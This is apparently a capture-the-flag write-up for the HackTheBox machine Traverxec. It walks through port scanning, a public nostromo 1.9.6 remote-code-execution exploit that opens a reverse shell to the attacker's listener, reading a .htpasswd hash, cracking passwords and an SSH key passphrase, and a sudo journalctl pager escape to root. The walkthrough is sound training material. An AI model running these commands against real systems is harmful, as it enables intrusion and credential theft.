---
tags:
title: Traverxec - Easy (HTB)
toc: true
permalink: /Traverxec-HTB-Writeup
toc_label: Topics
toc_sticky: true
sidebar: main
---
# Recon

```bash
nmapf 10.129.203.218
Nmap Full scan in progress
Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-24 14:39 -0500
Initiating Ping Scan at 14:39
Scanning 10.129.203.218 [4 ports]
Completed Ping Scan at 14:39, 0.38s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 14:39
Completed Parallel DNS resolution of 1 host. at 14:39, 0.50s elapsed
Initiating SYN Stealth Scan at 14:39
Scanning 10.129.203.218 [65535 ports]
Discovered open port 22/tcp on 10.129.203.218
Discovered open port 80/tcp on 10.129.203.218
Increasing send delay for 10.129.203.218 from 0 to 5 due to 11 out of 17 dropped probes since last increase.
Completed SYN Stealth Scan at 14:39, 15.78s elapsed (65535 total ports)
Nmap scan report for 10.129.203.218
Host is up, received echo-reply ttl 63 (0.62s latency).
Scanned at 2026-02-24 14:39:09 EST for 15s
Not shown: 65533 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 16.83 seconds
           Raw packets sent: 131083 (5.768MB) | Rcvd: 42 (4.556KB)
-e [*] IP: 10.129.203.218
[*] Puertos abiertos: 22,80
/usr/bin/xclip
-e [*] Service scanning with nmap against 22,80 Ports..
Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-24 14:39 -0500
Nmap scan report for 10.129.203.218
Host is up (0.58s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)
| ssh-hostkey:
|   2048 aa:99:a8:16:68:cd:41:cc:f9:6c:84:01:c7:59:09:5c (RSA)
|   256 93:dd:1a:23:ee:d7:1f:08:6b:58:47:09:73:a3:88:cc (ECDSA)
|_  256 9d:d6:62:1e:7a:fb:8f:56:92:e6:37:f1:10:db:9b:ce (ED25519)
80/tcp open  http    nostromo 1.9.6
|_http-title: TRAVERXEC
|_http-server-header: nostromo 1.9.6
| fingerprint-strings:
|   FourOhFourRequest:
|     HTTP/1.1 501 Not Implemented
|     Date: Tue, 24 Feb 2026 19:43:03 GMT
|     Server: nostromo 1.9.6
|     Connection: close
|     Content-Type: text/html
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
|     <html>
|     <head>
|     <title>501 Not Implemented</title>
|     <meta http-equiv="content-type" content="text/html; charset=iso-8859-1">
|     </head>
|     <body>
|     <h1>501 Not Implemented</h1>
|     <hr>
|     </body>
|     </html>
|   GenericLines:
|     HTTP/1.1 501 Not Implemented
|     Date: Tue, 24 Feb 2026 19:43:05 GMT
|     Server: nostromo 1.9.6
|     Connection: close
|     Content-Type: text/html
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
|     <html>
|     <head>
|     <title>501 Not Implemented</title>
|     <meta http-equiv="content-type" content="text/html; charset=iso-8859-1">
|     </head>
|     <body>
|     <h1>501 Not Implemented</h1>
|     <hr>
|     </body>
|     </html>
|   HTTPOptions:
|     HTTP/1.1 501 Not Implemented
|     Date: Tue, 24 Feb 2026 19:42:54 GMT
|     Server: nostromo 1.9.6
|     Connection: close
|     Content-Type: text/html
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
|     <html>
|     <head>
|     <title>501 Not Implemented</title>
|     <meta http-equiv="content-type" content="text/html; charset=iso-8859-1">
|     </head>
|     <body>
|     <h1>501 Not Implemented</h1>
|     <hr>
|     </body>
|     </html>
|   RTSPRequest:
|     HTTP/1.1 501 Not Implemented
|     Date: Tue, 24 Feb 2026 19:42:55 GMT
|     Server: nostromo 1.9.6
|     Connection: close
|     Content-Type: text/html
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
|     <html>
|     <head>
|     <title>501 Not Implemented</title>
|     <meta http-equiv="content-type" content="text/html; charset=iso-8859-1">
|     </head>
|     <body>
|     <h1>501 Not Implemented</h1>
|     <hr>
|     </body>
|_    </html>
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port80-TCP:V=7.98%I=7%D=2/24%Time=699DFE7D%P=x86_64-pc-linux-gnu%r(HTTP
SF:Options,186,"HTTP/1\.1\x20501\x20Not\x20Implemented\r\nDate:\x20Tue,\x2
SF:024\x20Feb\x202026\x2019:42:54\x20GMT\r\nServer:\x20nostromo\x201\.9\.6
SF:\r\nConnection:\x20close\r\nContent-Type:\x20text/html\r\n\r\n<!DOCTYPE
SF:\x20HTML\x20PUBLIC\x20\"-//W3C//DTD\x20HTML\x204\.01\x20Transitional//E
SF:N\">\n<html>\n<head>\n<title>501\x20Not\x20Implemented</title>\n<meta\x
SF:20http-equiv=\"content-type\"\x20content=\"text/html;\x20charset=iso-88
SF:59-1\">\n</head>\n<body>\n\n<h1>501\x20Not\x20Implemented</h1>\n\n<hr>\
SF:n\n</body>\n</html>")%r(RTSPRequest,186,"HTTP/1\.1\x20501\x20Not\x20Imp
SF:lemented\r\nDate:\x20Tue,\x2024\x20Feb\x202026\x2019:42:55\x20GMT\r\nSe
SF:rver:\x20nostromo\x201\.9\.6\r\nConnection:\x20close\r\nContent-Type:\x
SF:20text/html\r\n\r\n<!DOCTYPE\x20HTML\x20PUBLIC\x20\"-//W3C//DTD\x20HTML
SF:\x204\.01\x20Transitional//EN\">\n<html>\n<head>\n<title>501\x20Not\x20
SF:Implemented</title>\n<meta\x20http-equiv=\"content-type\"\x20content=\"
SF:text/html;\x20charset=iso-8859-1\">\n</head>\n<body>\n\n<h1>501\x20Not\
SF:x20Implemented</h1>\n\n<hr>\n\n</body>\n</html>")%r(FourOhFourRequest,1
SF:86,"HTTP/1\.1\x20501\x20Not\x20Implemented\r\nDate:\x20Tue,\x2024\x20Fe
SF:b\x202026\x2019:43:03\x20GMT\r\nServer:\x20nostromo\x201\.9\.6\r\nConne
SF:ction:\x20close\r\nContent-Type:\x20text/html\r\n\r\n<!DOCTYPE\x20HTML\
SF:x20PUBLIC\x20\"-//W3C//DTD\x20HTML\x204\.01\x20Transitional//EN\">\n<ht
SF:ml>\n<head>\n<title>501\x20Not\x20Implemented</title>\n<meta\x20http-eq
SF:uiv=\"content-type\"\x20content=\"text/html;\x20charset=iso-8859-1\">\n
SF:</head>\n<body>\n\n<h1>501\x20Not\x20Implemented</h1>\n\n<hr>\n\n</body
SF:>\n</html>")%r(GenericLines,186,"HTTP/1\.1\x20501\x20Not\x20Implemented
SF:\r\nDate:\x20Tue,\x2024\x20Feb\x202026\x2019:43:05\x20GMT\r\nServer:\x2
SF:0nostromo\x201\.9\.6\r\nConnection:\x20close\r\nContent-Type:\x20text/h
SF:tml\r\n\r\n<!DOCTYPE\x20HTML\x20PUBLIC\x20\"-//W3C//DTD\x20HTML\x204\.0
SF:1\x20Transitional//EN\">\n<html>\n<head>\n<title>501\x20Not\x20Implemen
SF:ted</title>\n<meta\x20http-equiv=\"content-type\"\x20content=\"text/htm
SF:l;\x20charset=iso-8859-1\">\n</head>\n<body>\n\n<h1>501\x20Not\x20Imple
SF:mented</h1>\n\n<hr>\n\n</body>\n</html>");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 87.21 seconds
```

![image-center](/assets/images/Pasted image 20260224165155.png)

```bash
searchsploit nostromo 1.9.6
---------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                            |  Path
---------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
nostromo 1.9.6 - Remote Code Execution                                                                                                                    | multiple/remote/47837.py
---------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

$ searchsploit -m multiple/remote/47837.py
  Exploit: nostromo 1.9.6 - Remote Code Execution
      URL: https://www.exploit-db.com/exploits/47837
     Path: /usr/share/exploitdb/exploits/multiple/remote/47837.py
    Codes: CVE-2019-16278
 Verified: True
File Type: Python script, ASCII text executable
Copied to: /home/zsln/Desktop/zsln/Traverxec/47837.py



$ mv 47837.py exploit.py
```

```bash
python3 poc.py -t 10.129.203.218 -p 80 --attacker-port 4444 --attacker-ip 10.10.17.19
[!] Make sure to start a listener on your attacking machine with the command:
 nc -lvnp 4444

[-] Sending payload to the server...: No response received. Retrying...
[+] Opening connection to 10.129.203.218 on port 80: Done
[*] Closed connection to 10.129.203.218 port 80
[*] Retrying (1/3)..
```

```BASH
 sudo nc -nvlp 4444
listening on [any] 4444 ...
connect to [10.10.17.19] from (UNKNOWN) [10.129.203.218] 44138
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

```BASH
www-data@traverxec:/var/nostromo/conf$ cat nhttpd.conf
# MAIN [MANDATORY]

servername		traverxec.htb
serverlisten		*
serveradmin		david@traverxec.htb
serverroot		/var/nostromo
servermimes		conf/mimes
docroot			/var/nostromo/htdocs
docindex		index.html

# LOGS [OPTIONAL]

logpid			logs/nhttpd.pid

# SETUID [RECOMMENDED]

user			www-data

# BASIC AUTHENTICATION [OPTIONAL]

htaccess		.htaccess
htpasswd		/var/nostromo/conf/.htpasswd

# ALIASES [OPTIONAL]

/icons			/var/nostromo/icons

# HOMEDIRS [OPTIONAL]

homedirs		/home
homedirs_public		public_www
```


```BASH
www-data@traverxec:/var/nostromo/conf$ cat .htpasswd
david:$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/
```

```bash
j hash
Created directory: /home/zsln/.john
Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
Use the "--format=md5crypt-long" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 256/256 AVX2 8x3])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Nowonly4me       (david)
1g 0:00:00:24 DONE (2026-02-24 15:19) 0.04035g/s 426893p/s 426893c/s 426893C/s Noyoudo..Nous4=5
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

```BASH
ssh david@traverxec.htb
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
david@traverxec.htb's password:
Permission denied, please try again.
david@traverxec.htb's password:
```


```BASH
www-data@traverxec:/var/nostromo/logs$ ls -la /home/david/public_www
total 16
drwxr-xr-x 3 david david 4096 Oct 25  2019 .
drwx--x--x 5 david david 4096 Oct 25  2019 ..
-rw-r--r-- 1 david david  402 Oct 25  2019 index.html
drwxr-xr-x 2 david david 4096 Oct 25  2019 protected-file-area
```

```bash
www-data@traverxec:/tmp$ ls -la ls -la /home/david/public_www/protected-file-area/
ls: cannot access 'ls': No such file or directory
/home/david/public_www/protected-file-area/:
total 16
drwxr-xr-x 2 david david 4096 Oct 25  2019 .
drwxr-xr-x 3 david david 4096 Oct 25  2019 ..
-rw-r--r-- 1 david david   45 Oct 25  2019 .htaccess
-rw-r--r-- 1 david david 1915 Oct 25  2019 backup-ssh-identity-files.tgz
```

```bash
www-data@traverxec:/tmp$ file backup-ssh-identity-files.tgz
backup-ssh-identity-files.tgz: gzip compressed data, last modified: Fri Oct 25 21:02:59 2019, from Unix, original size 10240
www-data@traverxec:/tmp$ gunzip backup-ssh-identity-files.tgz
www-data@traverxec:/tmp$ ls
backup-ssh-identity-files.tar  systemd-private-d014f61d6c2c4f0291215faf1f936d94-systemd-timesyncd.service-aFIeXI  vmware-root  vmware-root_387-1815350242
www-data@traverxec:/tmp$ tar -xvf backup-ssh-identity-files.tar
home/david/.ssh/
home/david/.ssh/authorized_keys
home/david/.ssh/id_rsa
home/david/.ssh/id_rsa.pub
```

```bash
$ ssh david@traverxec.htb -i id_rsa
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
Enter passphrase for key 'id_rsa':
Enter passphrase for key 'id_rsa':
Enter passphrase for key 'id_rsa':
david@traverxec.htb's password:
Permission denied, please try again.
david@traverxec.htb's password:
```

```bash
ssh2john id_rsa > hash_rsa
```

```bash
j hash_rsa
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
hunter           (id_rsa)
1g 0:00:00:00 DONE (2026-02-24 15:41) 100.0g/s 16000p/s 16000c/s 16000C/s carolina..david
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

```bash
ssh david@traverxec.htb -i id_rsa
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
Enter passphrase for key 'id_rsa':
Linux traverxec 4.19.0-6-amd64 #1 SMP Debian 4.19.67-2+deb10u1 (2019-09-20) x86_64
david@traverxec:~$  a  cat user.txt
cdb58089f4a69ea95a79c46f7daf547f
```

```bash
david@traverxec:~/bin$ ls
server-stats.head  server-stats.sh
david@traverxec:~/bin$ cat server-stats.sh
#!/bin/bash

cat /home/david/bin/server-stats.head
echo "Load: `/usr/bin/uptime`"
echo " "
echo "Open nhttpd sockets: `/usr/bin/ss -H sport = 80 | /usr/bin/wc -l`"
echo "Files in the docroot: `/usr/bin/find /var/nostromo/htdocs/ | /usr/bin/wc -l`"
echo " "
echo "Last 5 journal log lines:"
/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service | /usr/bin/cat
```

```bash
david@traverxec:~/bin$ /usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service
-- Logs begin at Tue 2026-02-24 14:41:14 EST, end at Tue 2026-02-24 15:49:22 EST. --
Feb 24 15:22:40 traverxec su[1048]: pam_unix(su:auth): authentication failure; logname= uid=33 euid=0 tty=pts/0 ruser=ww
Feb 24 15:22:42 traverxec su[1048]: FAILED SU (to david) www-data on pts/0
Feb 24 15:22:46 traverxec su[1049]: pam_unix(su:auth): authentication failure; logname= uid=33 euid=0 tty=pts/0 ruser=ww
Feb 24 15:22:48 traverxec su[1049]: FAILED SU (to david) www-data on pts/0
Feb 24 15:46:16 traverxec nhttpd[1018]: /../../../../bin/sh sent a bad cgi header
!/bin/bash
```

```bash
root@traverxec:~# cat root.txt
f744886dafeb233ea5b4181cef14f548
```